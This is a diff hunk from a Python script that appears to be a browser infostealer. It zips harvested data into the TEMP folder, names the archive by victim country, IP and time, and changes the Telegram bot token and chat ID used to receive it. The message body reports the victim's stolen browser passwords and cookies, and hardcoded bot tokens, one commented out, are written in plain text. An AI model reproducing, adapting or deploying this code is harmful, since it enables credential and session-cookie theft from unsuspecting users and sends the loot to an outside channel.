@@ -681,8 +681,8 @@ async def main():
     name_f = f"{country}_{ip}_{current_time}"
     z_ph = os.path.join(os.environ["TEMP"], name_f + ".zip")
     shutil.make_archive(z_ph[:-4], "zip", path_data)
-    TOKEN = "6922598295:AAE7WCiyqOqERqYJi2RBaDNCH7uFGD21Bog"
-    ID = "-4143427316"
+    TOKEN = "6761357605:AAFM2ncAfKU3BFJZK8_FzFI0LqokT05j5qQ"
+    ID = "-4189528046"
     # TOKEN = "6778520216:AAHOk7Nd71MJb5zCGPPd2Mwul6O9LfR-ixM"
     # ID = "qySWsj7mzMYzZmVl"
     body = f"====@hoiconcactaoy====\n⏰ Date => {datetime.now().strftime('%m/%d/%Y %H:%M')}\n🏴 Country => [{country}]\n🔍 IP => {ip}\n📝 Language => {language}\n====[ Browsers Data ]====\n🗝 Passwords => {passwd}\n🍪 Cookies => {cookies}"
